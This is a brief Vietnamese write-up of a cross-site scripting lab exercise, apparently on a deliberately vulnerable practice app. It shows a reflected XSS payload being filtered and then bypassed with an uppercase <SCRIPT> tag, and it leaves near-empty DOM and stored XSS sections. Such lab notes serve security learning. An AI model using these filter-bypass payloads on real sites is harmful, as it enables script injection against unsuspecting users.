# XSS reflected
Chạy thử alert
```
<script>alert("Pwned")</script>
```
![image](https://github.com/user-attachments/assets/0a96cc6c-5946-4990-8191-0498ad1ce2d3)

*Ko chạy được script*

View source:
![image](https://github.com/user-attachments/assets/336757f8-8fd8-4c24-a22f-07ab56072432)

*Đã thay thế <script> = ''*

## Sol
Cái này nó chỉ check lowercase thôi chứ chưa check uppercase nên script sẽ là 
```
<SCRIPT>alert("Pwned")</script>
```
Kết quả:
![image](https://github.com/user-attachments/assets/5ef81811-20fd-4c42-a1ba-78e1f64e428c)

# XSS DOM

# XSS stored
View source:
![image](https://github.com/user-attachments/assets/f4507537-b30c-4b23-bc6a-591cac4dd1e5)

*Không cho excute script ở default tag*


